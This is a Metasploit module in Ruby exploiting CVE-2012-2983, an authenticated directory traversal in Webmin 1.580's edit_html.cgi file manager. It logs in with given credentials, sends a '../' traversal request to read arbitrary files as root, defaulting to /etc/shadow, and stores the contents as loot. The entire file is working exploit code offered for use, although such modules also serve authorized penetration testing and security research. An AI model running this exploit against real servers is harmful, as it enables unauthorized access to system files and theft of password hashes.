##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access',
        'Description' => %q{
          This module exploits a directory traversal in Webmin 1.580. The vulnerability
          exists in the edit_html.cgi component and allows an authenticated user with access
          to the File Manager Module to access arbitrary files with root privileges. The
          module has been tested successfully with Webmin 1.580 over Ubuntu 10.04.
        },
        'Author' => [
          'Unknown', # From American Information Security Group
          'juan vazquez' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['OSVDB', '85247'],
          ['BID', '55446'],
          ['CVE', '2012-2983'],
          ['URL', 'http://www.americaninfosec.com/research/dossiers/AISG-12-002.pdf'],
          ['URL', 'https://github.com/webmin/webmin/commit/4cd7bad70e23e4e19be8ccf7b9f245445b2b3b80']
        ],
        'DisclosureDate' => '2012-09-06',
        'Actions' => [
          ['Download', { 'Description' => 'Download arbitrary file' }]
        ],
        'DefaultAction' => 'Download',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(10000),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('USERNAME', [true, 'Webmin Username']),
        OptString.new('PASSWORD', [true, 'Webmin Password']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 4]),
        OptString.new('RPATH', [ true, 'The file to download', '/etc/shadow' ])
      ]
    )
  end

  def run
    print_status('Attempting to login...')

    data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"

    res = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => '/session_login.cgi',
        'cookie' => 'testing=1',
        'data' => data
      }, 25
    )

    if res && (res.code == 302) && res.get_cookies =~ /sid/
      session = res.get_cookies.scan(/sid=(\w+);*/).flatten[0] || ''
      if session && !session.empty?
        print_good 'Authentication successful'
      else
        print_error 'Authentication failed'
        return
      end
    else
      print_error 'Authentication failed'
      return
    end

    print_status("Attempting to retrieve #{datastore['RPATH']}...")

    traversal = '../' * datastore['DEPTH']
    traversal << datastore['RPATH']
    data = "file=#{traversal}&text=1"

    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => "/file/edit_html.cgi?#{data}",
        'cookie' => "sid=#{session}"
      }, 25
    )

    if res && (res.code == 200) && res.body =~ /#{traversal}/ && res.body =~ %r{name=body>(.*)</textarea>}m
      loot = ::Regexp.last_match(1)
      f = ::File.basename(datastore['RPATH'])
      path = store_loot('webmin.file', 'application/octet-stream', rhost, loot, f, datastore['RPATH'])
      print_good("#{datastore['RPATH']} saved in #{path}")
    else
      print_error('Failed to retrieve the file')
      return
    end
  end
end
